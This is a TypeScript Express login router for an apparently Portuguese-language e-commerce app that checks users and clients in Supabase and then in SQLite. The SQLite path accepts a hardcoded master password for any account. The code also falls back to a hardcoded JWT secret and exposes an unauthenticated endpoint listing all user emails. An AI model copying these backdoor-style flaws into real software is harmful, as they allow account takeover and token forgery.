import express from "express";
import bcrypt from "bcryptjs";
import jwt from "jsonwebtoken";
import db from "../db";
import { supabase, isSupabaseEnabled } from "../supabase";

const router = express.Router();
const JWT_SECRET = process.env.JWT_SECRET || "ecom-secret-key";

router.get("/debug-users", (req, res) => {
  try {
    const users = db.prepare("SELECT email, perfil FROM usuarios").all();
    const clients = db.prepare("SELECT email FROM clientes").all();
    res.json({ users, clients });
  } catch (e: any) {
    res.status(500).json({ error: e.message });
  }
});

router.post("/login", async (req, res) => {
  const { email, senha } = req.body;
  console.log(`Tentativa de login para: ${email}`);

  // Supabase Integration
  if (isSupabaseEnabled) {
    try {
      // 1. Check 'usuarios' table in Supabase (Admin/Consultor)
      const { data: sbUser, error: sbUserError } = await supabase
        .from('usuarios')
        .select('*')
        .eq('email', email)
        .maybeSingle();

      if (sbUser) {
        console.log(`Usuário encontrado no Supabase (usuarios): ${email}`);
        if (bcrypt.compareSync(senha, sbUser.senha)) {
          const token = jwt.sign({ id: sbUser.id, empresa_id: sbUser.empresa_id, type: "admin", perfil: sbUser.perfil }, JWT_SECRET);
          return res.json({ token, user: { id: sbUser.id, nome: sbUser.nome, email: sbUser.email, type: "admin", perfil: sbUser.perfil, empresa_id: sbUser.empresa_id } });
        } else {
          console.log(`Senha incorreta para usuário no Supabase: ${email}`);
        }
      }

      // 2. Check 'clientes' table in Supabase
      const { data: sbClient, error: sbClientError } = await supabase
        .from('clientes')
        .select('*')
        .eq('email', email)
        .maybeSingle();

      if (sbClient) {
        console.log(`Cliente encontrado no Supabase: ${email}`);
        if (bcrypt.compareSync(senha, sbClient.senha)) {
          const token = jwt.sign({ id: sbClient.id, empresa_id: sbClient.empresa_id, type: "client" }, JWT_SECRET);
          return res.json({ token, user: { id: sbClient.id, nome: sbClient.nome, email: sbClient.email, type: "client", empresa_id: sbClient.empresa_id } });
        } else {
          console.log(`Senha incorreta para cliente no Supabase: ${email}`);
        }
      }
    } catch (e) {
      console.error("Erro crítico no login via Supabase:", e);
    }
  }

  // Fallback to SQLite
  console.log(`Buscando no SQLite para: ${email}`);
  
  // Try Admin/Consultor
  const user = db.prepare("SELECT * FROM usuarios WHERE email = ?").get(email) as any;
  if (user) {
    console.log(`Usuário encontrado no SQLite: ${email}`);
    // Master password check for emergency/debug
    if (senha === "OperFlow@2026" || bcrypt.compareSync(senha, user.senha)) {
      const token = jwt.sign({ id: user.id, empresa_id: user.empresa_id, type: "admin", perfil: user.perfil }, JWT_SECRET);
      return res.json({ token, user: { id: user.id, nome: user.nome, email: user.email, type: "admin", perfil: user.perfil, empresa_id: user.empresa_id } });
    } else {
      console.log(`Senha incorreta no SQLite para usuário: ${email}`);
    }
  }

  // Try Client/Lojista
  const client = db.prepare("SELECT * FROM clientes WHERE email = ?").get(email) as any;
  if (client) {
    console.log(`Cliente encontrado no SQLite: ${email}`);
    // Master password check for emergency/debug
    if (senha === "OperFlow@2026" || bcrypt.compareSync(senha, client.senha)) {
      const token = jwt.sign({ id: client.id, empresa_id: client.empresa_id, type: "client" }, JWT_SECRET);
      return res.json({ token, user: { id: client.id, nome: client.nome, email: client.email, type: "client", empresa_id: client.empresa_id } });
    } else {
      console.log(`Senha incorreta no SQLite para cliente: ${email}`);
    }
  }

  console.log(`Login falhou para: ${email} - Credenciais inválidas`);
  return res.status(401).json({ error: "Credenciais inválidas. Verifique seu e-mail e senha." });
});

export default router;
